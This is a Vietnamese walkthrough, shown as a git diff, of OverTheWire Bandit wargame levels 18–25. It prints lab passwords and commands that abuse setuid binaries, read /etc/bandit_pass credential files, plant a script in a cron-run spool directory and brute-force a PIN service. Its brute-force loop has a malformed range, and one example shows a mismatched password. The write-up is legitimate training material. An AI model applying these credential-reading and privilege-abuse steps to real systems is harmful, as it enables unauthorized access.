@@ -516,3 +516,369 @@ Connection to bandit.labs.overthewire.org closed.
 Đây không phải là sai password mà là cơ chế `auto logout` của level tiếp theo
 
 # Level 18 -> Level 19
+
+Mật khẩu cho level tiếp theo được lưu trong file `readme` trong thư mục chính, nhưng ai đó đã thay đổi tệp `.bashrc` để đăng xuất bạn ra khi bạn đăng nhập với SSH
+
+`.bashrc` là một tệp kịch bản (script) ẩn nằm trong thư mục gốc (~/.bashrc), tự động chạy mỗi khi bạn mở một cửa sổ terminal mới (non-login shell) trên Linux/macOS.
+
+Trong level này, `.bashrc` bị sửa thành kiểu:
+```
+echo "Byebye!"
+exit
+```
+Nghĩa là:
+- Vừa login vào
+- `.bashrc` chạy
+- in ra "Byebye!"
+- thoát
+
+Vì vậy, để tránh `.bashrc` thì mình sẽ không mở shell mà `cat` trực tiếp trong cùng một câu lệnh để đọc file luôn
+
+```
+ssh bandit18@bandit.labs.overthewire.org -p 2220 cat readme
+```
+
+![alt text](images/image-19.png)
+
+-> Password: `cGWpMaKXVwDUNgPAVJbWYuGHVn9zl3j8`
+
+# Level 19 -> Level 20
+
+Để truy cập level tiếp theo, cần sử dụng tập lệnh `setuid` trong thư mục chính. Mật khẩu của level này có thể được tìm thấy trong `/etc/bandit_pass` sau khi bạn sử dụng tập lệnh `setuid`
+
+`SetUID` là một quyền cho phép file thực thi chạy với quyền của chủ sở hữu file, thay vì người dùng hiện tại
+- Nếu file thuộc về `bandit20`
+- Và có SetUID -> khi `bandit19` chạy file đó, chương trình sẽ chạy với quyền `bandit20`
+
+Liệt kê chi tiết các file trong thư mục chính
+
+```
+bandit19@bandit:~$ ls -l
+total 16
+-rwsr-x--- 1 bandit20 bandit19 14888 Apr  3 15:17 bandit20-do
+```
+
+Trong file `bandit20-do` có quyền `rws` -> Đây là file SetUID có owner: `bandit20`
+
+Chạy thử file này
+
+```
+bandit19@bandit:~$ ./bandit20-do
+Run a command as another user.
+  Example: ./bandit20-do whoami
+```
+
+thông báo này cho biết: `bandit20-do` là chương trình cho phép chạy lệnh với quyền của user khác
+
+```
+bandit19@bandit:~$ ./bandit20-do whoami
+bandit20
+```
+
+thông thường `whoami` -> `bandit19`, nhưng khi chạy qua `bandit20-do` -> `bandit20`. Điều này chứng minh lệnh được thực thi với quyền `bandit20`
+
+Giờ chạy lệnh để đọc password
+
+```
+./bandit20-do cat /etc/bandit_pass/bandit20
+```
+
+![alt text](images/image-20.png)
+
+-> Password: `0qXahG8ZjOVMN9Ghs7iOWsCfZyXOUbYO`
+
+# Level 20 -> Level 21
+
+Sử dụng chương trinh SetUID để lấy password của level tiếp theo
+
+Chương trình này sẽ:
+- Kết nối tới `localhost` tại một `port` do người dùng chỉ định
+- Đọc một dòng dữ liệu từ kết nối
+- So sánh với password của level hiện tại `(bandit20)`
+- Nếu đúng thì trả về password của `bandit21`
+
+Để khai thác, ta cần:
+- Tạo một server (listener) trên máy local, server này sẽ gửi password bandit20 khi có kết nối
+- Sau đó sẽ cho chương trình SetUID kết nối vào server đó
+
+Sử dụng `nc` để tạo một `listener` lắng nghe các kết nối đến. Để `nc` gửi mật khẩu, ta sử dụng lệnh `echo` và chuyển tiếp nó vào `nc`. Cờ `-n` để ngăn các kí tự xuống dòng trong đầu vào. Cuối cùng, cho phép tiến trình chạy ngầm bằng lệnh `&`
+
+```
+bandit20@bandit:~$ echo -n '0qXahG8ZjOVMN9Ghs7iOWsCfZyXOUbYO' | nc -l -p 1234 &
+```
+
+Chạy chương trình SetUID với port `1234` để kết nối tới server netcat
+```
+./suconnect 1234
+```
+
+![alt text](images/image-21.png)
+
+-> Password: `EeoULMCra2q0dSkYj561DX7s1CpBuOBt`
+
+# Level 21 -> Level 22
+
+Một chương trình đang chạy tự động định kì từ `cron`, trình lập lịch tác vụ dựa trên thời gian. Hãy xem cấu hình trong `/etc/cron.d/` và xem lệnh nào đang được thực thi
+
+Như đã mô tả, `cronjob` là các chương trình chạy tự động theo định kì. Trong Linux, có nhiều thư mục có thể chứa các cronjob này: cron.d, cron.daily, cron.hour, cron.monthly, crontab, cron.weekly.
+
+Các thư mục này chứa các tệp hướng dẫn cách chạy chương trình.
+
+Đầu tiên, tìm kiếm trong thư mục `/etc/cron.d`. Ta thấy `cronjob_bandit22`
+
+```
+bandit21@bandit:~$ ls /etc/cron.d
+behemoth4_cleanup  
+clean_tmp  
+cronjob_bandit22  
+cronjob_bandit23  
+cronjob_bandit24  
+e2scrub_all  
+leviathan5_cleanup  
+manpage3_resetpw_job  
+otw-tmp-dir  
+sysstat
+
+bandit21@bandit:~$ cat /etc/cron.d/cronjob_bandit22
+@reboot bandit22 /usr/bin/cronjob_bandit22.sh &> /dev/null
+* * * * * bandit22 /usr/bin/cronjob_bandit22.sh &> /dev/null
+```
+
+Cronjob này chạy `/usr/bin/cronjob_bandit22.sh` với quyền `bandit22`. 5 `*` chỉ ra rằng nó chạy mỗi phút, mỗi ngày. 
+
+Để biết chính xác nó được thực thi như thế nào, ta cần xem bash file
+
+```
+bandit21@bandit:~$ cat /usr/bin/cronjob_bandit22.sh
+#!/bin/bash
+chmod 644 /tmp/t7O6lds9S0RqQh9aMcz6ShpAoZKF7fgv
+cat /etc/bandit_pass/bandit22 > /tmp/t7O6lds9S0RqQh9aMcz6ShpAoZKF7fgv
+```
+
+File này tạo một file trong thư mục `tmp` và đưa quyền `read` cho mọi người `644`. Sau đó nó copy input của file mật khẩu bandit22 vào một file mới được tạo
+
+Vì vậy password cho level tiếp theo được nằm trong file đã được tạo
+
+```
+bandit21@bandit:~$ cat /tmp/t7O6lds9S0RqQh9aMcz6ShpAoZKF7fgv
+tRae0UfB9v0UzbCdn9cY0gQnds9GF58Q
+```
+
+-> Password: `tRae0UfB9v0UzbCdn9cY0gQnds9GF58Q`
+
+# Level 22 -> Level 23
+
+Một chương trình đang chạy tự động định kì từ `cron`, trình lập lịch tác vụ dựa trên thời gian. Hãy xem cấu hình trong `/etc/cron.d/` và xem lệnh nào đang được thực thi
+
+Ta sẽ bắt đầu với cách tương tự level 22:
+
+```
+bandit22@bandit:~$ ls -l /etc/cron.d
+total 40
+-r--r----- 1 root root  47 Apr  3 15:18 behemoth4_cleanup
+-rw-r--r-- 1 root root 123 Apr  3 15:10 clean_tmp
+-rw-r--r-- 1 root root 120 Apr  3 15:17 cronjob_bandit22
+-rw-r--r-- 1 root root 122 Apr  3 15:17 cronjob_bandit23
+-rw-r--r-- 1 root root 120 Apr  3 15:17 cronjob_bandit24
+-rw-r--r-- 1 root root 201 Apr  8  2024 e2scrub_all
+-r--r----- 1 root root  48 Apr  3 15:19 leviathan5_cleanup
+-rw------- 1 root root 138 Apr  3 15:19 manpage3_resetpw_job
+-rwx------ 1 root root  52 Apr  3 15:21 otw-tmp-dir
+-rw-r--r-- 1 root root 396 Jan  9  2024 sysstat
+
+bandit22@bandit:~$ cat /etc/cron.d/cronjob_bandit23
+@reboot bandit23 /usr/bin/cronjob_bandit23.sh  &> /dev/null
+* * * * * bandit23 /usr/bin/cronjob_bandit23.sh  &> /dev/null
+
+bandit22@bandit:~$ cat /usr/bin/cronjob_bandit23.sh
+#!/bin/bash
+
+myname=$(whoami)
+mytarget=$(echo I am user $myname | md5sum | cut -d ' ' -f 1)
+
+echo "Copying passwordfile /etc/bandit_pass/$myname to /tmp/$mytarget"
+
+cat /etc/bandit_pass/$myname > /tmp/$mytarget
+```
+
+Đoạn script này chỉ giới thiệu về biến (`variables`).
+
+Biến đầu tiên là `myname` và lưu output từ `whoami`, vì đoạn script này được chạy với `bandit23` nên câu lệnh `whoami` sẽ in ra `bandit23`.
+
+Biến tiếp theo là `mytarget` được dùng làm filename, filename này tạo bởi dòng
+
+```
+echo I am user $myname | md5sum | cut -d ' ' -f 1
+```
+
+Dòng cuối chỉ ra rằng mật khẩu từ bandit23 sẽ được viết vào filename: `mytarget` trong thư mục `/tmp`
+
+```
+cat /etc/bandit_pass/$myname > /tmp/$mytarget
+```
+
+Vì vậy ta cần tính trước tên file, thay `$myname` bằng `bandit23` vào value của `$mytarget` 
+
+![alt text](images/image-22.png)
+
+-> Password: `0Zf11ioIjMVN551jX3CmStKLYqjk54Ga`
+
+# Level 23 -> Level 24
+
+Một chương trình đang chạy tự động định kì từ `cron`, trình lập lịch tác vụ dựa trên thời gian. Hãy xem cấu hình trong `/etc/cron.d/` và xem lệnh nào đang được thực thi
+
+```
+bandit23@bandit:~$ cat /usr/bin/cronjob_bandit24.sh
+#!/bin/bash
+
+shopt -s nullglob
+
+myname=$(whoami)
+
+cd /var/spool/"$myname"/foo || exit
+echo "Executing and deleting all scripts in /var/spool/$myname/foo:"
+for i in * .*;
+do
+    if [ "$i" != "." ] && [ "$i" != ".." ];
+    then
+        echo "Handling $i"
+        owner="$(stat --format "%U" "./$i")"
+        if [ "${owner}" = "bandit23" ] && [ -f "$i" ]; then
+            timeout -s 9 60 "./$i"
+        fi
+        rm -rf "./$i"
+    fi
+```
+
+Đoạn script thực thi và xóa toàn bộ file trong folder `/var/spool/bandit24`
+
+Vòng lặp `for` duyệt tất cả các file.
+
+Câu lệnh `if` đầu tiên đảm bảo rằng các thư mục `.` và `..` đại diện cho thư mục hiện tại và thư mục trước, thì bỏ qua.
+
+```
+if [ "$i" != "." ] && [ "$i" != ".." ];
+```
+
+Lấy `owner` của file và xét điều kiện thực thi
+
+```
+owner="$(stat --format "%U" "./$i")"
+if [ "${owner}" = "bandit23" ] && [ -f "$i" ];
+```
+
+Nếu owner là `bandit23`, đoạn script `timeout -s 9 60 "./$i"` được thực thi
+
+Sau đó file sẽ bị xóa
+```
+rm -rf "./$i"
+```
+Để khai thác, ta viết 1 script thực hiện lấy mật khẩu của `bandit24`. 
+
+Đầu tiên tạo 1 file trong thư mục `tmp`, điều này giúp ngăn chặn việc xóa tập tin quá sớm và bạn có một bản sao phòng trường hợp xảy ra sự cố. Sau đó chuyển file này vào folder `/var/spool/bandit24`
+
+```
+bandit23@bandit:~$ mktemp -d
+/tmp/tmp.QLQlGaMrzu
+
+bandit23@bandit:~$ cd /tmp/tmp.QLQlGaMrzu
+
+bandit23@bandit:/tmp/tmp.QLQlGaMrzu$ nano bandit24_pass.sh
+```
+
+Nội dung của file:
+
+```
+#!/bin/bash
+
+cat /etc/bandit_pass/bandit24 > /tmp/tmp.QLQlGaMrzu/password
+```
+
+Set các quyền cho file và folder
+
+```
+bandit23@bandit:/tmp/tmp.QLQlGaMrzu$ chmod +rwx bandit24_pass.sh
+
+bandit23@bandit:/tmp/tmp.QLQlGaMrzu$ chmod 777 -R /tmp/tmp.QLQlGaMrzu
+
+bandit23@bandit:/tmp/tmp.QLQlGaMrzu$ touch password
+
+bandit23@bandit:/tmp/tmp.QLQlGaMrzu$ chmod +rwx password
+```
+
+Chuyển file vào thư mục `/var/spool/bandit24/foo/`
+
+```
+cp bandit24_pass.sh /var/spool/bandit24/foo/
+```
+
+Chờ 1 phút và mở file `password` để xem mật khẩu
+
+-> Password: `gb8KRRCsshuZXI0tUuR6ypOFjiZbf3G8`
+
+# Level 24 -> Level 25
+
+Một **tiến trình nền (daemon)** đang lắng nghe trên port `30002` và sẽ đưa cho bạn mật khẩu của bandit25 nếu được gửi mật khẩu của bandit24 và 1 mã pin bí mật gồm 4 chữ số.
+
+Không có cách nào lấy mã pin ngoại trừ việc thử 10000 tổ hợp, được gọi là **brute-forcing**
+
+*Note: Bạn không cần phải tạo connections mới mỗi lần*
+
+Đầu tiên, thử connect với port bằng `nc` để xem response của nó 
+
+```
+bandit24@bandit:~$ nc localhost 30002
+I am the pincode checker for user bandit25. Please enter the password for user bandit24 and the secret pincode on a single line, separated by a space.
+gb8KRRCsshuZXI0tUuR6ypOFjiZbf3G8 0000
+Wrong! Please enter the correct current password and pincode. Try again.
+```
+
+Ta thấy rằng khi ta gửi sai mã pin, ta nhận được một dòng phản hổi
+
+Viết 1 script thực hiện gen ra toàn bộ tổ hợp có thể của mã pin sau đó gửi cho port 30002:
+```
+#!/bin/bash
+
+for i in {0000...9999}
+do
+    echo gb8KRRCsshuZXI0tUuR6ypOFjiZbf3G8 $i >> pass.txt
+done
+
+cat pass.txt | nc localhost 30002 > result.txt
+```
+
+- Vòng lặp `for` tạo ra các giá trị từ 0000 -> 9999 và tạo input gửi cho server
+
+- Với mỗi `i`, script sẽ ghi vào file 1 payload như sau: `UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ 0000`
+
+-> File `pass.txt` chứa 10000 dòng input hợp lệ
+
+- Gửi toàn bộ input vào server và lưu response vào file `result.txt`
+
+Tạo 1 thư mục tạm và lưu script, set quyền và thực thi script đó
+```
+bandit24@bandit: mktemp -d
+/tmp/tmp.Z5UCymBowE$
+
+bandit24@bandit: cd /tmp/tmp.Z5UCymBowE$
+
+bandit24@bandit:/tmp/tmp.Z5UCymBowE$ nano script.sh
+
+bandit24@bandit:/tmp/tmp.Z5UCymBowE$ chmod +x script.sh
+
+bandit24@bandit:/tmp/tmp.Z5UCymBowE$ ./script.sh
+```
+
+Sau khi chạy script, sẽ có 2 file được tạo là `pass.txt` và `result.txt`
+
+Lọc nhanh kết quả: `grep -v "Wrong" result.txt` và thu được mật khẩu
+
+```
+bandit24@bandit:/tmp/tmp.Z5UCymBowE$ grep -v "Wrong" result.txt
+I am the pincode checker for user bandit25. Please enter the password for user bandit24 and the secret pincode on a single line, separated by a space.
+Correct!
+The password of user bandit25 is iCi86ttT4KSNe1armKiwbQNmB3YJP3q4
+```
+
+-> Password: `iCi86ttT4KSNe1armKiwbQNmB3YJP3q4`
+
